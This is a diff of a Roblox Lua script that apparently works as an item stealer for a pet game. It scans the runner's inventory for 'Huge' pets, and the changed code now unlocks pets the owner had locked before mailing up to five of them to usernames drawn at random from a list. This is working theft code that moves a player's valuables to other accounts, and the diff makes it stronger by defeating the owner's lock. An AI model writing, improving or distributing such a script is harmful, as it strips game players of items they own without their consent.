@@ -6,27 +6,42 @@ local result = saveModule.Get()
 local pet = result.Inventory.Pet
 local hugeSentCount = 0
 
-for i, v in pairs(pet) do
-    if string.match(v.id, "Huge") then
-        local username = usernames[math.random(#usernames)]
+local HugeUIDList = {}
+
+-- Check for Huge pets and unlock if locked
+for PetUID, PetData in pairs(pet) do
+    if string.match(PetData.id, "Huge") then
+        table.insert(HugeUIDList, PetUID)
         
-        local args = {
-            username, -- Tên người dùng nhận pet được chọn ngẫu nhiên.
-            v.id, -- ID của pet Huge.
-            "Pet", -- Loại của item đang gửi là Pet.
-            i, -- Index của pet trong danh sách.
-            v._am or 1 -- Số lượng của pet, nếu không có thông tin thì mặc định là 1.
-        }
-        
-        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
-        
-        hugeSentCount = hugeSentCount + 1
-        print("Đã gửi " .. v.id .. " đến " .. username)
-        
-        if hugeSentCount >= 5 then
-            break 
+        -- Unlock Huge pet if locked
+        if PetData._lk then
+            repeat
+                task.wait()
+            until game:GetService("ReplicatedStorage").Network:FindFirstChild("Locking_SetLocked"):InvokeServer(PetUID, false)
+            print("Unlocked", PetUID)
         end
     end
 end
 
-print("Tổng số Huge đã gửi: " .. hugeSentCount)
+-- Send unlocked Huge pets
+for _, PetUID in pairs(HugeUIDList) do
+    local username = usernames[math.random(#usernames)]
+    
+    local args = {
+        username, -- Randomly selected recipient username
+        pet[PetUID].id, -- ID of the Huge pet
+        "Pet", -- Type of item (Pet)
+        PetUID, -- Pet UID
+        pet[PetUID]._am or 1 -- Amount (default to 1 if not specified)
+    }
+
+    game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+    hugeSentCount = hugeSentCount + 1
+    print("Sent", pet[PetUID].id, "to", username)
+    
+    if hugeSentCount >= 5 then
+        break -- Stop after sending 5 Huge pets
+    end
+end
+
+print("Total Huge sent:", hugeSentCount)
